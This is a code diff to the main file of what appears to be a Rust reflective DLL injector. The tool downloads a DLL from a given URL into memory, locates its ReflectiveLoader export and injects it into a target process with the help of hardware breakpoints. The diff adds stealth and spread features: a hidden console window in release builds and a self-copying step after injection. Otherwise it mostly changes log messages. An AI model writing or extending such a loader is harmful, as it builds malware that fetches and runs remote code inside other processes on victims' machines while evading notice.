@@ -1,11 +1,13 @@
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+
+
 mod download;
 mod parse_pe;
 mod inject;
 mod hwbp;
-
+mod file;
 
 use clap::Parser;
-use crate::hwbp::hwbp_cleanup;
 
 
 /// Inject ReflectiveDLL.dll into a target process.
@@ -36,28 +38,28 @@ fn main() {
     let args = Args::parse();
 
     let Some(url) = args.url else {
-        eprintln!("Error: --url must be provided.");
+        eprintln!("[ERROR] --url must be provided.");
         std::process::exit(1);
     };
 
 
-    println!("Downloading from {}", url);
+    println!("[INFO] Downloading from {}", url);
 
     let data = download::download_to_memory(&url, None, None)
         .expect("Failed to download file");
 
     if data.len() > 0 {
-        println!("Downloaded {} bytes", data.len());
+        println!("[INFO] Downloaded {} bytes", data.len());
     } else {
-        println!("Downloaded empty file");
+        println!("[INFO] Downloaded empty file");
     }
 
 
     // let dll = pe_parser::new(data);
     let dll = parse_pe::PeParser::new(data);
 
-    let func_raw = dll.get_func_raw(&args.rflname).expect("Failed to find ReflectiveLoader function");
-    println!("ReflectiveLoader raw offset: 0x{:X}", func_raw);
+    let func_raw = dll.get_func_raw(&args.rflname).expect("[ERROR] Failed to find ReflectiveLoader function");
+    println!("[INFO] ReflectiveLoader raw offset: 0x{:X}", func_raw);
 
 
     let dr0 = hwbp::DR::Dr0;
@@ -81,12 +83,16 @@ fn main() {
         func_raw,
     ).expect("Failed to inject DLL!\n");
 
+    file::self_copying().expect("[ERROR] Failed to copy executable!");
+
     unsafe {
         let _ = hwbp::unset_hwbp(&dr0);
         let _ = hwbp::unset_hwbp(&dr1);
         let _ = hwbp::unset_hwbp(&dr2);
         let _ = hwbp::unset_hwbp(&dr3);
-        let _ = hwbp_cleanup().expect("[ERROR] Failed to cleanup hardware breakpoints!");
+        let _ = hwbp::hwbp_cleanup().expect("[ERROR] Failed to cleanup hardware breakpoints!");
     }
+
+    
 
 }
